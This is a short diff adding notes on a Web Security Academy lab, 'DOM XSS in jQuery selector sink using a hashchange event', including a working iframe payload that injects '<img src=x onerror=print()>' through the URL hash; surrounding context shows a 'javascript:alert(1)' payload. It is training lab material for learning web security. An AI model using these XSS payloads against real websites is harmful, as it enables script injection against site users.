@@ -45,3 +45,10 @@ javascript:alert(1)
 
 ![[Pasted image 20240803074347.png]]
 
+# DOM XSS in jQuery selector sink using a hashchange event
+
+```html
+<iframe src="https://0a7700c6030ec6b582e3533b006c00b1.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+```
+
+
